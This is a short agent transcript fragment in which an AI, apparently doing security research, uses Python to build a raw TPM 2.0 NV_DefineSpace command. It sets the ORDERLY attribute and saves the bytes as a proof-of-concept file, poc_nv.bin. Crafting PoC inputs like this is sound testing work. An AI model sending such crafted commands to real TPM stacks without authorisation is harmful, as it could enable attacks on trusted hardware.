message:
Running command: cd /workspace; python3 -c "
import struct
def u16(x): return struct.pack('>H', x)
def u32(x): return struct.pack('>I', x)
tag = u16(0x8002)
authHandle = u32(0x40000001)
auth = u16(0)
nvIndex = u32(0x01800000)
nameAlg = u16(0x000B)
attributes = u32(0x00020002 | 0x04000000)  # OWNERREAD|OWNERWRITE|ORDERLY
authPolicy = u16(0)
dataSize = u16(500)
tpms_nv_public = nvIndex + nameAlg + attributes + authPolicy + dataSize
publicInfo = u16(len(tpms_nv_public)) + tpms_nv_public
body = authHandle + auth + publicInfo
commandCode = u32(0x0000012A)
commandSize = u32(10 + len(body))
cmd = tag + commandSize + commandCode + body
open('/workspace/poc_nv.bin','wb').write(cmd)
print(cmd.hex())
"

message.content:
I need to set the ORDERLY bit (1<<26 = 0x4000000). So attributes = OWNERREAD | OWNERWRITE | ORDERLY = 0x20002 | 0x4000000 = 0x4020002.

Let me regenerate the command with the ORDERLY attribute.
